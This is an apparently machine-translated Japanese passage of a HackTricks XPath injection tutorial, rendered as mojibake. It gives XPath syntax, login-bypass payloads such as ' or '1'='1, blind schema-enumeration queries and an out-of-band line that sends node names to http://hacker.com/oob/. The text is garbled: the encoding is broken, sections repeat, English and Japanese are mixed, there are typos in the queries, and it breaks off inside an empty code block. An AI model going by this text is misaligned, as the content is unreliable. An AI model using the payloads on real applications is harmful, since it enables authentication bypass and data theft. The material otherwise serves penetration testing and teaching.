# XPATHã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰**ã™ã‚‹ã«ã¯ã€[**hacktricksãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks)ã¨[**hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks-cloud)ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**HackenProofã‚’ãƒ•ã‚©ãƒ­ãƒ¼**](https://bit.ly/3xrrDrL) **ã—ã¦ã€web3ã®ãƒã‚°ã«ã¤ã„ã¦ã‚‚ã£ã¨å­¦ã³ã¾ã—ã‚‡ã†**

ğŸ web3ã®ãƒã‚°ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ã‚’èª­ã‚€

ğŸ”” æ–°ã—ã„ãƒã‚°å ±å¥¨é‡‘ã«ã¤ã„ã¦é€šçŸ¥ã‚’å—ã‘ã‚‹

ğŸ’¬ ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãƒ‡ã‚£ã‚¹ã‚«ãƒƒã‚·ãƒ§ãƒ³ã«å‚åŠ ã™ã‚‹

## **åŸºæœ¬æ§‹æ–‡**

XPathã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒæä¾›ã—ãŸå…¥åŠ›ã‹ã‚‰XPathï¼ˆXMLãƒ‘ã‚¹è¨€èªï¼‰ã‚¯ã‚¨ãƒªã‚’æ§‹ç¯‰ã—ã€XMLãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’ã‚¯ã‚¨ãƒªã¾ãŸã¯ãƒŠãƒ“ã‚²ãƒ¼ãƒˆã™ã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã®æ”»æ’ƒæŠ€è¡“ã§ã™ã€‚

ã‚¯ã‚¨ãƒªã®ä½œã‚Šæ–¹ã«é–¢ã™ã‚‹æƒ…å ±ï¼š[https://www.w3schools.com/xml/xpath\_syntax.asp](https://www.w3schools.com/xml/xpath\_syntax.asp)

### ãƒãƒ¼ãƒ‰

| å¼         | èª¬æ˜                                                                                                 |
| ---------- | ---------------------------------------------------------------------------------------------------- |
| nodename   | åå‰ãŒã€Œnodenameã€ã®ã™ã¹ã¦ã®ãƒãƒ¼ãƒ‰ã‚’é¸æŠã—ã¾ã™ã€‚                                                     |
| /          | ãƒ«ãƒ¼ãƒˆãƒãƒ¼ãƒ‰ã‹ã‚‰é¸æŠã—ã¾ã™ã€‚                                                                         |
| //         | ç¾åœ¨ã®ãƒãƒ¼ãƒ‰ã‹ã‚‰ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆå†…ã®é¸æŠã«ä¸€è‡´ã™ã‚‹ãƒãƒ¼ãƒ‰ã‚’é¸æŠã—ã¾ã™ã€‚ã©ã“ã«ã‚ã£ã¦ã‚‚é¸æŠã—ã¾ã™ã€‚         |
| .          | ç¾åœ¨ã®ãƒãƒ¼ãƒ‰ã‚’é¸æŠã—ã¾ã™ã€‚                                                                           |
| ..         | ç¾åœ¨ã®ãƒãƒ¼ãƒ‰ã®è¦ªã‚’é¸æŠã—ã¾ã™ã€‚                                                                       |
| @          | å±æ€§ã‚’é¸æŠã—ã¾ã™ã€‚                                                                                   |

### **ä¾‹:**

| ãƒ‘ã‚¹å¼         | çµæœ                                                                                                 |
| --------------- | ---------------------------------------------------------------------------------------------------- |
| bookstore       | åå‰ãŒã€Œbookstoreã€ã®ã™ã¹ã¦ã®ãƒãƒ¼ãƒ‰ã‚’é¸æŠã—ã¾ã™ã€‚                                                     |
| /bookstore      | bookstoreè¦ç´ ã‚’é¸æŠã—ã¾ã™ã€‚**æ³¨:** ãƒ‘ã‚¹ãŒã‚¹ãƒ©ãƒƒã‚·ãƒ¥ï¼ˆ/ï¼‰ã§å§‹ã¾ã‚‹å ´åˆã€å¸¸ã«è¦ç´ ã¸ã®çµ¶å¯¾ãƒ‘ã‚¹ã‚’è¡¨ã—ã¾ã™ã€‚ |
| bookstore/book  | bookstoreã®å­ã§ã‚ã‚‹ã™ã¹ã¦ã®bookè¦ç´ ã‚’é¸æŠã—ã¾ã™ã€‚                                                     |
| //book          | ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆå†…ã®ã©ã“ã«ã‚ã£ã¦ã‚‚ã€ã™ã¹ã¦ã®bookè¦ç´ ã‚’é¸æŠã—ã¾ã™ã€‚                                         |
| bookstore//book | bookstoreè¦ç´ ã®å­å­«ã§ã‚ã‚‹ã™ã¹ã¦ã®bookè¦ç´ ã‚’é¸æŠã—ã¾ã™ã€‚ã©ã“ã«ã‚ã£ã¦ã‚‚é¸æŠã—ã¾ã™ã€‚                     |
| //@lang         | langã¨ã„ã†åå‰ã®å±æ€§ã‚’é¸æŠã—ã¾ã™ã€‚                                                                   |

### è¿°èª

| ãƒ‘ã‚¹å¼                     | çµæœ                                                                                                                                                                                                                                                                                                         |
| ----------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| /bookstore/book\[1]                 | <p>bookstoreè¦ç´ ã®å­ã§ã‚ã‚‹æœ€åˆã®bookè¦ç´ ã‚’é¸æŠã—ã¾ã™ã€‚<strong>æ³¨:</strong> IE 5,6,7,8,9ã§ã¯æœ€åˆã®ãƒãƒ¼ãƒ‰ã¯[0]ã§ã™ãŒã€W3Cã«ã‚ˆã‚‹ã¨[1]ã§ã™ã€‚ã“ã®å•é¡Œã‚’IEã§è§£æ±ºã™ã‚‹ã«ã¯ã€SelectionLanguageã‚’XPathã«è¨­å®šã—ã¾ã™ã€‚</p><p>JavaScriptã§ã®è¨­å®šæ–¹æ³•: xml.setProperty("SelectionLanguage","XPath");</p> |
| /bookstore/book\[last()]            | bookstoreè¦ç´ ã®å­ã§ã‚ã‚‹æœ€å¾Œã®bookè¦ç´ ã‚’é¸æŠã—ã¾ã™ã€‚                                                                                                                                                                                                                                       |
| /bookstore/book\[last()-1]          | bookstoreè¦ç´ ã®å­ã§ã‚ã‚‹æœ€å¾Œã‹ã‚‰2ç•ªç›®ã®bookè¦ç´ ã‚’é¸æŠã—ã¾ã™ã€‚                                                                                                                                                                                                                               |
| /bookstore/book\[position()<3]      | bookstoreè¦ç´ ã®å­ã§ã‚ã‚‹æœ€åˆã®2ã¤ã®bookè¦ç´ ã‚’é¸æŠã—ã¾ã™ã€‚                                                                                                                                                                                                                                 |
| //title\[@lang]                     | langã¨ã„ã†åå‰ã®å±æ€§ã‚’æŒã¤ã™ã¹ã¦ã®titleè¦ç´ ã‚’é¸æŠã—ã¾ã™ã€‚                                                                                                                                                                                                                                               |
| //title\[@lang='en']                | "lang"å±æ€§ã®å€¤ãŒ"en"ã§ã‚ã‚‹ã™ã¹ã¦ã®titleè¦ç´ ã‚’é¸æŠã—ã¾ã™ã€‚                                                                                                                                                                                                                               |
| /bookstore/book\[price>35.00]       | bookstoreè¦ç´ ã®bookè¦ç´ ã§ã€ä¾¡æ ¼è¦ç´ ã®å€¤ãŒ35.00ã‚ˆã‚Šå¤§ãã„ã‚‚ã®ã‚’é¸æŠã—ã¾ã™ã€‚                                                                                                                                                                                               |
| /bookstore/book\[price>35.00]/title | bookstoreè¦ç´ ã®bookè¦ç´ ã§ã€ä¾¡æ ¼è¦ç´ ã®å€¤ãŒ35.00ã‚ˆã‚Šå¤§ãã„ã‚‚ã®ã®titleè¦ç´ ã‚’é¸æŠã—ã¾ã™ã€‚                                                                                                                                                                         |

### ä¸æ˜ãªãƒãƒ¼ãƒ‰

| ãƒ¯ã‚¤ãƒ«ãƒ‰ã‚«ãƒ¼ãƒ‰ | èª¬æ˜                  |
| -------- | ---------------------------- |
| \*       | ä»»æ„ã®è¦ç´ ãƒãƒ¼ãƒ‰ã«ä¸€è‡´ã—ã¾ã™     |
| @\*      | ä»»æ„ã®å±æ€§ãƒãƒ¼ãƒ‰ã«ä¸€è‡´ã—ã¾ã™   |
| node()   | ä»»æ„ã®ç¨®é¡ã®ãƒãƒ¼ãƒ‰ã«ä¸€è‡´ã—ã¾ã™ |

### **ä¾‹:**

| ãƒ‘ã‚¹å¼ | çµæœ                                                                   |
| --------------- | ------------------------------------------------------------------------ |
| /bookstore/\*   | bookstoreè¦ç´ ã®å­è¦ç´ ãƒãƒ¼ãƒ‰ã‚’ã™ã¹ã¦é¸æŠã—ã¾ã™             |
| //\*            | ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆå†…ã®ã™ã¹ã¦ã®è¦ç´ ã‚’é¸æŠã—ã¾ã™                                     |
| //title\[@\*]   | ã©ã‚“ãªç¨®é¡ã®å±æ€§ã§ã‚‚æŒã¤ã™ã¹ã¦ã®titleè¦ç´ ã‚’é¸æŠã—ã¾ã™ |

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**HackenProofã‚’ãƒ•ã‚©ãƒ­ãƒ¼**](https://bit.ly/3xrrDrL) **ã—ã¦ã€web3ã®ãƒã‚°ã«ã¤ã„ã¦ã‚‚ã£ã¨å­¦ã³ã¾ã—ã‚‡ã†**

ğŸ web3ã®ãƒã‚°ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ã‚’èª­ã‚€

ğŸ”” æ–°ã—ã„ãƒã‚°å ±å¥¨é‡‘ã«ã¤ã„ã¦é€šçŸ¥ã‚’å—ã‘ã‚‹

ğŸ’¬ ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãƒ‡ã‚£ã‚¹ã‚«ãƒƒã‚·ãƒ§ãƒ³ã«å‚åŠ ã™ã‚‹
## ä¾‹

### Payloads

### ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰

```plaintext
' or '1'='1
' or '1'='1' or 'a'='a
' or 1=1 or 'a'='a
' or 1=1
' or 'a'='a
```

### Exploiting

### æ‚ªç”¨

```plaintext
' or '1'='1
' or '1'='1' or 'a'='a
' or 1=1 or 'a'='a
' or 1=1
' or 'a'='a
```

### Fixing

### ä¿®æ­£

To prevent XPath injection, you should:

XPathã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’é˜²ããŸã‚ã«ã¯ã€ä»¥ä¸‹ã®å¯¾ç­–ã‚’å–ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

- Validate and sanitize user input before using it in XPath queries.
- XPathã‚¯ã‚¨ãƒªã§ä½¿ç”¨ã™ã‚‹å‰ã«ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å…¥åŠ›ã‚’æ¤œè¨¼ãŠã‚ˆã³ã‚µãƒ‹ã‚¿ã‚¤ã‚ºã—ã¾ã™ã€‚
- Use parameterized XPath queries instead of concatenating user input directly into the query.
- ã‚¯ã‚¨ãƒªã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å…¥åŠ›ã‚’ç›´æ¥é€£çµã™ã‚‹ä»£ã‚ã‚Šã«ã€ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿åŒ–ã•ã‚ŒãŸXPathã‚¯ã‚¨ãƒªã‚’ä½¿ç”¨ã—ã¾ã™ã€‚
- Limit the privileges of the user account used for executing XPath queries.
- XPathã‚¯ã‚¨ãƒªã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®ç‰¹æ¨©ã‚’åˆ¶é™ã—ã¾ã™ã€‚
- Implement proper error handling to avoid leaking sensitive information.
- æ©Ÿå¯†æƒ…å ±ã®æ¼æ´©ã‚’é˜²ããŸã‚ã«ã€é©åˆ‡ãªã‚¨ãƒ©ãƒ¼ãƒãƒ³ãƒ‰ãƒªãƒ³ã‚°ã‚’å®Ÿè£…ã—ã¾ã™ã€‚

### References

### å‚è€ƒæ–‡çŒ®

- [OWASP XPath Injection](https://owasp.org/www-community/attacks/XPATH_Injection)
- [XPath Injection - PortSwigger](https://portswigger.net/web-security/xpath-injection)
- [XPath Injection - W3Schools](https://www.w3schools.com/xml/xpath_injection.asp)
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<data>
<user>
<name>pepe</name>
<password>peponcio</password>
<account>admin</account>
</user>
<user>
<name>mark</name>
<password>m12345</password>
<account>regular</account>
</user>
<user>
<name>fino</name>
<password>fino2</password>
<account>regular</account>
</user>
</data>
```
### æƒ…å ±ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹

XPath Injectionï¼ˆXPathã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ï¼‰ã¯ã€Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®è„†å¼±æ€§ã®ä¸€ã¤ã§ã‚ã‚Šã€æ”»æ’ƒè€…ãŒã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‹ã‚‰æƒ…å ±ã‚’æŠ½å‡ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

XPathï¼ˆXML Path Languageï¼‰ã¯ã€XMLæ–‡æ›¸å†…ã®è¦ç´ ã‚’æŒ‡å®šã™ã‚‹ãŸã‚ã®è¨€èªã§ã™ã€‚XPath Injectionæ”»æ’ƒã§ã¯ã€æ”»æ’ƒè€…ã¯ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®å…¥åŠ›ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã«æ‚ªæ„ã®ã‚ã‚‹XPathã‚¯ã‚¨ãƒªã‚’æŒ¿å…¥ã—ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‹ã‚‰æƒ…å ±ã‚’å–å¾—ã—ã¾ã™ã€‚

ä»¥ä¸‹ã¯ã€XPath Injectionæ”»æ’ƒã®ä¸€èˆ¬çš„ãªä¾‹ã§ã™ã€‚

```xml
' or '1'='1
```

ã“ã®æ”»æ’ƒã§ã¯ã€æ”»æ’ƒè€…ã¯å…¥åŠ›ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã« `' or '1'='1` ã¨ã„ã†æ–‡å­—åˆ—ã‚’æŒ¿å…¥ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯å¸¸ã«çœŸã®æ¡ä»¶ã‚’è©•ä¾¡ã—ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å†…ã®ã™ã¹ã¦ã®æƒ…å ±ã‚’è¿”ã—ã¾ã™ã€‚

XPath Injectionæ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã¯ã€ä»¥ä¸‹ã®æ‰‹é †ã‚’å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

1. ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®å…¥åŠ›ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã‚’ç‰¹å®šã—ã¾ã™ã€‚
2. å…¥åŠ›ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã«æ‚ªæ„ã®ã‚ã‚‹XPathã‚¯ã‚¨ãƒªã‚’æŒ¿å…¥ã—ã¾ã™ã€‚
3. ã‚¯ã‚¨ãƒªã®çµæœã‚’å–å¾—ã—ã€æƒ…å ±ã‚’æŠ½å‡ºã—ã¾ã™ã€‚

XPath Injectionæ”»æ’ƒã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒé©åˆ‡ãªå…¥åŠ›æ¤œè¨¼ã‚„ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—å‡¦ç†ã‚’è¡Œã£ã¦ã„ãªã„å ´åˆã«æˆåŠŸã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚æ”»æ’ƒè€…ã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã—ã¦æ©Ÿå¯†æƒ…å ±ã‚’å…¥æ‰‹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®é–‹ç™ºè€…ã‚„ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒãƒ¼ãƒ ã¯ã€XPath Injectionæ”»æ’ƒã«å¯¾ã™ã‚‹é˜²å¾¡ç­–ã‚’å®Ÿè£…ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚å…¥åŠ›æ¤œè¨¼ã‚„ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—å‡¦ç†ã®å®Ÿæ–½ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ†ã‚¹ãƒˆã®å®Ÿæ–½ã€æœ€æ–°ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ‘ãƒƒãƒã®é©ç”¨ãªã©ãŒé‡è¦ã§ã™ã€‚
```
All names - [pepe, mark, fino]
name
//name
//name/node()
//name/child::node()
user/name
user//name
/user/name
//user/name

All values - [pepe, peponcio, admin, mark, ...]
//user/node()
//user/child::node()


Positions
//user[position()=1]/name #pepe
//user[last()-1]/name #mark
//user[position()=1]/child::node()[position()=2] #peponcio (password)

Functions
count(//user/node()) #3*3 = 9 (count all values)
string-length(//user[position()=1]/child::node()[position()=1]) #Length of "pepe" = 4
substrig(//user[position()=2/child::node()[position()=1],2,1) #Substring of mark: pos=2,length=1 --> "a"
```
### ã‚¹ã‚­ãƒ¼ãƒã®ç‰¹å®šã¨ç›—ã¿å‡ºã—

XPathã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦ã€Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚¹ã‚­ãƒ¼ãƒã‚’ç‰¹å®šã—ã€ç›—ã¿å‡ºã™ã“ã¨ãŒã§ãã¾ã™ã€‚

#### ã‚¹ã‚­ãƒ¼ãƒã®ç‰¹å®š

1. ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ãƒã‚¤ãƒ³ãƒˆã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã«ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®å…¥åŠ›ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã«ä»»æ„ã®æ–‡å­—åˆ—ã‚’å…¥åŠ›ã—ã¾ã™ã€‚
2. ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ãƒã‚¤ãƒ³ãƒˆã§XPathã‚¯ã‚¨ãƒªã‚’æ§‹ç¯‰ã—ã¾ã™ã€‚ä¾‹ãˆã°ã€`' or 1=1 or ''='`ã‚’ä½¿ç”¨ã—ã¦ã¿ã¾ã™ã€‚
3. ã‚¯ã‚¨ãƒªãŒæˆåŠŸã—ãŸå ´åˆã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®å¿œç­”ã«ã¯é€šå¸¸ã¨ã¯ç•°ãªã‚‹ã‚¨ãƒ©ãƒ¼ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãŒè¡¨ç¤ºã•ã‚Œã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ã“ã®ã‚¨ãƒ©ãƒ¼ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã«ã¯ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®ã‚¹ã‚­ãƒ¼ãƒæƒ…å ±ãŒå«ã¾ã‚Œã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

#### ã‚¹ã‚­ãƒ¼ãƒã®ç›—ã¿å‡ºã—

1. ã‚¹ã‚­ãƒ¼ãƒæƒ…å ±ã‚’ç‰¹å®šã—ãŸã‚‰ã€XPathã‚¯ã‚¨ãƒªã‚’ä½¿ç”¨ã—ã¦ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‹ã‚‰ã‚¹ã‚­ãƒ¼ãƒæƒ…å ±ã‚’æŠ½å‡ºã—ã¾ã™ã€‚
2. ä¾‹ãˆã°ã€`' or 1=1 or ''=(//table)[1]/@*[name()='name']`ã‚’ä½¿ç”¨ã—ã¦ã€æœ€åˆã®ãƒ†ãƒ¼ãƒ–ãƒ«ã®åå‰å±æ€§ã‚’å–å¾—ã—ã¾ã™ã€‚
3. ã‚¯ã‚¨ãƒªã‚’å®Ÿè¡Œã—ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®å¿œç­”ã«ã¯ã‚¹ã‚­ãƒ¼ãƒæƒ…å ±ãŒå«ã¾ã‚Œã‚‹ã¯ãšã§ã™ã€‚

ã“ã‚Œã«ã‚ˆã‚Šã€XPathã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’åˆ©ç”¨ã—ã¦Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚¹ã‚­ãƒ¼ãƒã‚’ç‰¹å®šã—ã€ç›—ã¿å‡ºã™ã“ã¨ãŒã§ãã¾ã™ã€‚
```python
and count(/*) = 1 #root
and count(/*[1]/*) = 2 #count(root) = 2 (a,c)
and count(/*[1]/*[1]/*) = 1 #count(a) = 1 (b)
and count(/*[1]/*[1]/*[1]/*) = 0 #count(b) = 0
and count(/*[1]/*[2]/*) = 3 #count(c) = 3 (d,e,f)
and count(/*[1]/*[2]/*[1]/*) = 0 #count(d) = 0
and count(/*[1]/*[2]/*[2]/*) = 0 #count(e) = 0
and count(/*[1]/*[2]/*[3]/*) = 1 #count(f) = 1 (g)
and count(/*[1]/*[2]/*[3]/[1]*) = 0 #count(g) = 0

#The previous solutions are the representation of a schema like the following
#(at this stage we don't know the name of the tags, but jus the schema)
<root>
<a>
<b></b>
</a>
<c>
<d></d>
<e></e>
<f>
<h></h>
</f>
</c>
</root>

and name(/*[1]) = "root" #Confirm the name of the first tag is "root"
and substring(name(/*[1]/*[1]),1,1) = "a" #First char of name of tag `<a>` is "a"
and string-to-codepoints(substring(name(/*[1]/*[1]/*),1,1)) = 105 #Firts char of tag `<b>`is codepoint 105 ("i") (https://codepoints.net/)

#Stealing the schema via OOB
doc(concat("http://hacker.com/oob/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))
doc-available(concat("http://hacker.com/oob/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))
```
## èªè¨¼ãƒã‚¤ãƒ‘ã‚¹

### **ã‚¯ã‚¨ãƒªã®ä¾‹ï¼š**
```
string(//user[name/text()='+VAR_USER+' and password/text()='+VAR_PASSWD+']/account/text())
$q = '/usuarios/usuario[cuenta="' . $_POST['user'] . '" and passwd="' . $_POST['passwd'] . '"]';
```
### **ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®ORãƒã‚¤ãƒ‘ã‚¹ï¼ˆä¸¡æ–¹ã«åŒã˜å€¤ã‚’ä½¿ç”¨ï¼‰**

In some cases, when a web application uses the same value for both the username and password fields, it is possible to bypass authentication using an XPath injection attack. This attack takes advantage of the OR operator in XPath queries to manipulate the authentication logic.

ã„ãã¤ã‹ã®å ´åˆã€ã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®ä¸¡æ–¹ã«åŒã˜å€¤ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã€XPathã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³æ”»æ’ƒã‚’ä½¿ç”¨ã—ã¦èªè¨¼ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®æ”»æ’ƒã¯ã€XPathã‚¯ã‚¨ãƒªã®ORæ¼”ç®—å­ã‚’åˆ©ç”¨ã—ã¦èªè¨¼ãƒ­ã‚¸ãƒƒã‚¯ã‚’æ“ä½œã—ã¾ã™ã€‚

To perform this attack, you need to identify a vulnerable parameter that is used in an XPath query. Then, you can craft a payload that injects an OR condition to bypass the authentication check. The payload would look something like this:

ã“ã®æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ã«ã¯ã€XPathã‚¯ã‚¨ãƒªã§ä½¿ç”¨ã•ã‚Œã‚‹è„†å¼±ãªãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’ç‰¹å®šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚æ¬¡ã«ã€èªè¨¼ãƒã‚§ãƒƒã‚¯ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ãŸã‚ã«ORæ¡ä»¶ã‚’æ³¨å…¥ã™ã‚‹ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä½œæˆã—ã¾ã™ã€‚ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚

```plaintext
' or '1'='1
```

By injecting this payload into the vulnerable parameter, the resulting XPath query would become:

ã“ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’è„†å¼±ãªãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã«æ³¨å…¥ã™ã‚‹ã“ã¨ã§ã€çµæœã¨ã—ã¦å¾—ã‚‰ã‚Œã‚‹XPathã‚¯ã‚¨ãƒªã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚

```plaintext
